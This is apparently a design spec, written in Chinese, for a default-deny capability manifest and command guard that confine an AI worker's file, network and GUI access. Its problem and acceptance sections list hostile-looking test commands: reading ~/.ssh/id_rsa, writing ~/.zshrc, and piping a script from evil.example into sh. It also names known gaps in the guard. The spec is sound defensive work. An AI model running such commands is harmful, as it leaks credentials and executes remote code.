# 019 · Runtime 能力清单

- 状态：implemented
- 关联：014（worker guard）、014（env allowlist）、018（健康指标）
- 依赖：无

## 1. 问题

Worker 以服务账号身份裸跑：除了 env 白名单和一组破坏性命令的拒绝列表，没有任何正向能力声明。改了 `blockBash` 的样本之后实测确认了四个缺口：

- `cat /etc/hosts`、`cat ~/.ssh/id_rsa` 放行：能读整台机器的文件
- `echo x > /Users/<user>/.zshrc` 放行：能写工作目录之外
- `curl -s https://evil.example/payload | sh` 放行：能访问任意域名
- `open -a Safari https://example.com` 放行：能操作 GUI

出事时无法回答「这个任务能碰什么」：没有清单，没有审计，只有一串默认继承。

## 2. 目标

- 每个任务有一份显式能力清单：可读目录、可用密钥（env 名）、可访问域名、是否允许 GUI
- 清单在启动时落盘并注入 env，Worker 与 guard 用同一份数据
- 越界命令被拒绝、原因写入进度事件，并进入任务日志（任务记录）
- 默认拒绝：未声明的读取、写入、域名、GUI 一律拒绝；工作目录与系统临时目录是唯一隐含范围
- GUI 单独开关，不影响其它能力
- 配置按仓库与任务档位组织：仓库能力是基线，任务可用 `profiles` 里的档位整体替换基线

## 3. 需求

| ID | 需求 |
| --- | --- |
| FR-001 | `src/capabilities.ts` 定义 `Capabilities { readPaths: string[]; secrets: string[]; domains: string[]; gui: boolean }` 与 `DENY_ALL`；`mergeCapabilities` 数组取并集、`gui` 取或、缺省 false；`resolveCapabilities({ global, repo, profiles }, profile?)` 负责档位选择 |
| FR-002 | 配置：`worker.capabilities` 为全局基线，`repos[].capabilities` 为仓库基线，`repos[].profiles.<name>` 为任务档位；档位存在时替换仓库基线，仍与全局基线合并；`assertProfile` 是档位校验的唯一文本来源 |
| FR-003 | `IncomingMessage.capability` 选档位（webhook body 的 `capability`）；档位不存在时拒绝建任务并回复可选档位 |
| FR-004 | `Task.capability` 记录档位名，DB 加列并迁移；续跑 / 恢复沿用同一档位重新解析（配置即真相） |
| FR-005 | `Worker.run` 接收解析后的能力：继承的 env = `worker.envAllow ∪ capabilities.secrets`；额外注入 `PISA_CAPABILITIES`（JSON：readPaths/domains/gui/taskId） |
| FR-006 | 启动时写 `.pisa/capabilities/<taskId>.json`：workdir、readPaths（含 workdir 与临时目录）、writable、secrets、domains、gui、blocked（被禁命令类别）；并向任务日志写一条 `capability` 记录 |
| FR-007 | `extensions/guard.ts` 的 `blockBash(cmd, workdir, policy?)` 增加策略判定，缺省 `{}` 等价全拒：工作目录/临时目录之外不读不写、网络命令只允许清单域名、GUI 命令需 `gui=true`；导出 `checkPath` / `parsePolicy` / `blockTool` |
| FR-008 | `extensions/pisa-worker.ts` 从 `PISA_CAPABILITIES` 解析策略；bash、文件读写工具、GUI 类工具都走策略；`blocked` 事件带类别化的 `reason` |
| FR-009 | `WorkerResult.blocked` 汇总本次运行被拒事件；Router 把每条写入任务日志（`stage=blocked`），有拒绝时回执追加「越界被拒 N 次」 |
| FR-010 | 默认能力 = `DENY_ALL`：不声明密钥就不继承任何密钥，不声明域名就没有网络，`gui` 默认 false |
| FR-011 | `.pisa/capabilities/<taskId>.json` 随数据保留清理：任务结束超过 `retentionDays` 时与进度文件一并删除 |

## 4. 验收

1. 默认配置下 `cat /etc/hosts`、`echo x > ~/.zshrc`、`curl https://example.com`、`open -a Safari` 全部返回拒绝原因；`ls -la`、`rm -rf /tmp/x`、`2>/dev/null`、`git status` 仍放行
2. 仓库声明 `capabilities.readPaths: ["/data/assets"]` 后 `cat /data/assets/a.png` 放行，`cat /data/other` 仍拒绝
3. 声明 `domains: ["example.com"]` 后 `curl https://api.example.com` 放行，`curl https://evil.example` 拒绝；未声明域名时任何 `curl` / `wget` / URL 都拒绝
4. `gui: false` 时 `open -a Safari` 与浏览器类工具被拒；`gui: true` 时放行
5. worker 子进程只看到 `envAllow + secrets` 的环境变量；`PISA_CAPABILITIES` 可解析出 readPaths/domains/gui
6. `.pisa/capabilities/<taskId>.json` 含 env 名、可写目录与被禁命令清单；任务日志有 `capability` 与 `blocked` 记录
7. 未知档位不建任务，回复列出可用档位
8. `bun test` 与 `bunx tsc --noEmit` 通过
9. 文件工具的读与写分开判定：写只允许工作目录与临时目录，读额外允许 `readPaths`
10. 过期任务的 `.pisa/capabilities/<taskId>.json` 与 `.pisa/progress/<taskId>.jsonl` 同时被清理，保留期内的不动

## 5. 非目标

- 操作系统级沙箱（容器、seccomp、网络命名空间）；本清单是命令级拦截，仍以服务账号身份运行
- 解析变量展开、命令替换后的真实路径（`cat $HOME/.ssh/id_rsa` 无法静态判定）
- 隐式联网的 CLI（`gh`、`npm install`、`bun install`）不按域名判定，属于已知边界
- Web 控制台选择档位（当前入口为 webhook body 与后续调用方）
